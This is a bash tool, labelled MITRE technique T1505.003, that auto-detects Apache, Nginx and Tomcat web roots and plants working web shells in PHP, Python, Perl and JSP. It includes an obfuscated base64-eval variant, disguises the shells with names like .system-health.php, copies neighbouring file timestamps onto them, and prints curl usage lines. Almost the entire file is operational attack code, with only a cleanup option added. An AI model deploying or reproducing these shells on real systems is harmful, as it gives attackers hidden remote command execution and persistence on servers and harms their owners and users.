#!/bin/bash
# T1505.003 — Server Software Component: Web Shell
# Auto-detect web servers and deploy various web shells

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_webshell"

banner_ws() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1505.003 — Web Shell Deployment            ║"
    echo "  ║   PHP / Python / Perl / JSP — Auto-detect     ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_webroot() {
    echo -e "${CYAN}[*] Auto-detecting web server document roots...${NC}"
    local -a ROOTS=()

    # Apache
    for conf in /etc/apache2/sites-enabled/*.conf /etc/httpd/conf.d/*.conf /etc/apache2/apache2.conf /etc/httpd/conf/httpd.conf; do
        [[ -r "$conf" ]] || continue
        local dr
        dr=$(grep -iE '^\s*DocumentRoot' "$conf" 2>/dev/null | awk '{print $2}' | tr -d '"' | head -3)
        for d in $dr; do
            [[ -d "$d" ]] && ROOTS+=("$d")
        done
    done

    # Nginx
    for conf in /etc/nginx/sites-enabled/* /etc/nginx/conf.d/*.conf /etc/nginx/nginx.conf; do
        [[ -r "$conf" ]] || continue
        local dr
        dr=$(grep -iE '^\s*root\s' "$conf" 2>/dev/null | awk '{print $2}' | tr -d ';' | head -3)
        for d in $dr; do
            [[ -d "$d" ]] && ROOTS+=("$d")
        done
    done

    # Common defaults
    for d in /var/www/html /var/www /srv/http /srv/www /usr/share/nginx/html /var/www/localhost/htdocs; do
        [[ -d "$d" ]] && ROOTS+=("$d")
    done

    # Tomcat
    for d in /var/lib/tomcat*/webapps/ROOT /opt/tomcat*/webapps/ROOT /usr/share/tomcat*/webapps/ROOT; do
        [[ -d "$d" ]] && ROOTS+=("$d")
    done

    # Deduplicate
    local -a UNIQUE=()
    local seen=""
    for r in "${ROOTS[@]}"; do
        if [[ "$seen" != *"|${r}|"* ]]; then
            UNIQUE+=("$r")
            seen+="|${r}|"
        fi
    done

    if [[ ${#UNIQUE[@]} -eq 0 ]]; then
        echo -e "${RED}[!] No web roots found${NC}"
        read -p "  Enter web root manually: " manual
        [[ -d "$manual" ]] && UNIQUE+=("$manual") || return 1
    fi

    echo "  Found web roots:"
    local i=0
    for r in "${UNIQUE[@]}"; do
        echo -e "  ${CYAN}[$i]${NC} $r"
        i=$((i + 1))
    done

    read -p "  Select root [0]: " sel
    sel="${sel:-0}"
    WEBROOT="${UNIQUE[$sel]}"
    [[ -z "$WEBROOT" ]] && { echo -e "${RED}[!] Invalid${NC}"; return 1; }
    echo -e "${GREEN}[+] Using: ${WEBROOT}${NC}"
}

deploy_php() {
    echo -e "${CYAN}[*] Deploying PHP web shell...${NC}"
    detect_webroot || return

    echo -e "  ${CYAN}[1]${NC} Simple command exec"
    echo -e "  ${CYAN}[2]${NC} Password-protected shell"
    echo -e "  ${CYAN}[3]${NC} File manager + command exec"
    echo -e "  ${CYAN}[4]${NC} Obfuscated (base64 eval)"
    read -p "  Variant [1]: " var
    var="${var:-1}"

    read -p "  Shell filename [.system-health.php]: " fname
    fname="${fname:-.system-health.php}"
    local SHELL_PATH="${WEBROOT}/${fname}"

    case "$var" in
        1)
            cat > "$SHELL_PATH" << 'PHPEOF'
<?php /* d3m0n_webshell */ if(isset($_REQUEST['c'])){echo '<pre>'.shell_exec($_REQUEST['c']).'</pre>';} ?>
PHPEOF
            echo -e "${GREEN}[+] Usage: curl 'http://TARGET/${fname}?c=id'${NC}"
            ;;
        2)
            read -p "  Shell password: " WPASS
            local WHASH
            WHASH=$(echo -n "$WPASS" | md5sum | awk '{print $1}')
            cat > "$SHELL_PATH" << PHPEOF
<?php /* ${MARKER} */
\$k='${WHASH}';
if(isset(\$_REQUEST['k'])&&md5(\$_REQUEST['k'])===\$k){
    if(isset(\$_REQUEST['c'])){echo '<pre>'.shell_exec(\$_REQUEST['c']).'</pre>';}
    if(isset(\$_REQUEST['u'])){@move_uploaded_file(\$_FILES['f']['tmp_name'],\$_REQUEST['u']);}
}
?>
PHPEOF
            echo -e "${GREEN}[+] Usage: curl 'http://TARGET/${fname}?k=${WPASS}&c=id'${NC}"
            ;;
        3)
            cat > "$SHELL_PATH" << 'PHPEOF'
<?php /* d3m0n_webshell */
if(isset($_REQUEST['c'])){echo '<pre>'.shell_exec($_REQUEST['c']).'</pre>';}
elseif(isset($_REQUEST['dir'])){
    $d=$_REQUEST['dir'];
    $files=scandir($d);
    echo '<pre>';
    foreach($files as $f){
        $fp=$d.'/'.$f;
        $p=substr(sprintf('%o',fileperms($fp)),-4);
        $s=filesize($fp);
        $t=date('Y-m-d H:i:s',filemtime($fp));
        echo sprintf("%-6s %-12s %-20s %s\n",$p,$s,$t,$f);
    }
    echo '</pre>';
}
elseif(isset($_REQUEST['read'])){echo '<pre>'.htmlspecialchars(file_get_contents($_REQUEST['read']),ENT_QUOTES).'</pre>';}
elseif(isset($_REQUEST['write'])&&isset($_REQUEST['data'])){file_put_contents($_REQUEST['write'],$_REQUEST['data']);echo 'OK';}
?>
PHPEOF
            echo -e "${GREEN}[+] File manager shell deployed${NC}"
            echo -e "${GREEN}[+] Usage: ?c=cmd | ?dir=/etc | ?read=/etc/passwd | ?write=/tmp/f&data=content${NC}"
            ;;
        4)
            # Obfuscated shell — the eval payload is base64-encoded
            local PAYLOAD='if(isset($_REQUEST["c"])){echo "<pre>".shell_exec($_REQUEST["c"])."</pre>";}'
            local B64
            B64=$(echo -n "$PAYLOAD" | base64)
            cat > "$SHELL_PATH" << PHPEOF
<?php /* ${MARKER} */ @eval(base64_decode('${B64}')); ?>
PHPEOF
            echo -e "${GREEN}[+] Obfuscated shell deployed${NC}"
            echo -e "${GREEN}[+] Usage: curl 'http://TARGET/${fname}?c=id'${NC}"
            ;;
    esac

    chmod 644 "$SHELL_PATH" 2>/dev/null
    # Match timestamps with neighboring files
    local ref
    ref=$(find "$WEBROOT" -maxdepth 1 -type f ! -name "$fname" -print -quit 2>/dev/null)
    [[ -n "$ref" ]] && touch -r "$ref" "$SHELL_PATH" 2>/dev/null

    echo -e "${GREEN}[+] Shell path: ${SHELL_PATH}${NC}"
}

deploy_python() {
    echo -e "${CYAN}[*] Deploying Python WSGI/CGI backdoor...${NC}"
    detect_webroot || return

    read -p "  Shell filename [.health_check.py]: " fname
    fname="${fname:-.health_check.py}"
    local SHELL_PATH="${WEBROOT}/${fname}"

    cat > "$SHELL_PATH" << 'PYEOF'
#!/usr/bin/env python3
# d3m0n_webshell
import subprocess, os
try:
    from http.server import BaseHTTPRequestHandler
    from urllib.parse import parse_qs, urlparse
except ImportError:
    pass

# CGI mode
if os.environ.get('REQUEST_METHOD'):
    import cgi
    print("Content-Type: text/plain\n")
    form = cgi.FieldStorage()
    cmd = form.getvalue('c', '')
    if cmd:
        print(subprocess.getoutput(cmd))
else:
    # Standalone server mode
    import http.server
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            q = parse_qs(urlparse(self.path).query)
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            cmd = q.get('c', [''])[0]
            if cmd:
                self.wfile.write(subprocess.getoutput(cmd).encode())
        def log_message(self, *a): pass
    http.server.HTTPServer(('0.0.0.0', 8443), H).serve_forever()
PYEOF

    chmod 755 "$SHELL_PATH" 2>/dev/null
    local ref
    ref=$(find "$WEBROOT" -maxdepth 1 -type f ! -name "$fname" -print -quit 2>/dev/null)
    [[ -n "$ref" ]] && touch -r "$ref" "$SHELL_PATH" 2>/dev/null

    echo -e "${GREEN}[+] Python shell: ${SHELL_PATH}${NC}"
    echo -e "${GREEN}[+] CGI: http://TARGET/cgi-bin/${fname}?c=id${NC}"
    echo -e "${GREEN}[+] Standalone: python3 ${SHELL_PATH} (listens :8443)${NC}"
}

deploy_perl() {
    echo -e "${CYAN}[*] Deploying Perl CGI shell...${NC}"
    detect_webroot || return

    read -p "  Shell filename [.diagnostics.pl]: " fname
    fname="${fname:-.diagnostics.pl}"

    # Try CGI-BIN directories
    local CGI_DIR=""
    for d in "${WEBROOT}/cgi-bin" /usr/lib/cgi-bin /var/www/cgi-bin; do
        [[ -d "$d" ]] && { CGI_DIR="$d"; break; }
    done
    CGI_DIR="${CGI_DIR:-${WEBROOT}}"

    local SHELL_PATH="${CGI_DIR}/${fname}"

    cat > "$SHELL_PATH" << 'PLEOF'
#!/usr/bin/perl
# d3m0n_webshell
use strict;
use CGI;
my $q = CGI->new;
print $q->header('text/plain');
my $cmd = $q->param('c');
if ($cmd) { print `$cmd`; }
PLEOF

    chmod 755 "$SHELL_PATH" 2>/dev/null
    echo -e "${GREEN}[+] Perl CGI shell: ${SHELL_PATH}${NC}"
    echo -e "${GREEN}[+] Usage: http://TARGET/cgi-bin/${fname}?c=id${NC}"
}

deploy_jsp() {
    echo -e "${CYAN}[*] Deploying JSP shell (Tomcat)...${NC}"
    detect_webroot || return

    read -p "  Shell filename [health.jsp]: " fname
    fname="${fname:-health.jsp}"
    local SHELL_PATH="${WEBROOT}/${fname}"

    cat > "$SHELL_PATH" << 'JSPEOF'
<%-- d3m0n_webshell --%>
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
JSPEOF

    chmod 644 "$SHELL_PATH" 2>/dev/null
    echo -e "${GREEN}[+] JSP shell: ${SHELL_PATH}${NC}"
    echo -e "${GREEN}[+] Usage: http://TARGET:8080/${fname}?c=id${NC}"
}

ws_cleanup() {
    echo -e "${CYAN}[*] Scanning for deployed web shells...${NC}"
    local found=0

    find / -maxdepth 6 -type f \( -name "*.php" -o -name "*.py" -o -name "*.pl" -o -name "*.jsp" \) 2>/dev/null | while IFS= read -r f; do
        if grep -q "$MARKER" "$f" 2>/dev/null; then
            echo -e "  Found: $f"
            read -p "  Remove? [y/N]: " yn
            [[ "$yn" =~ ^[Yy] ]] && rm -f "$f" && echo -e "${GREEN}  [+] Removed${NC}"
            found=$((found + 1))
        fi
    done

    [[ $found -eq 0 ]] && echo -e "${YELLOW}[!] No d3m0n web shells found${NC}"
}

main() {
    banner_ws

    echo -e "  ${CYAN}[1]${NC} Deploy PHP web shell"
    echo -e "  ${CYAN}[2]${NC} Deploy Python WSGI/CGI backdoor"
    echo -e "  ${CYAN}[3]${NC} Deploy Perl CGI shell"
    echo -e "  ${CYAN}[4]${NC} Deploy JSP shell (Tomcat)"
    echo -e "  ${CYAN}[5]${NC} Cleanup / remove shells"
    echo ""
    read -p "Choose [1-5]: " OPT

    case "$OPT" in
        1) deploy_php ;;
        2) deploy_python ;;
        3) deploy_perl ;;
        4) deploy_jsp ;;
        5) ws_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
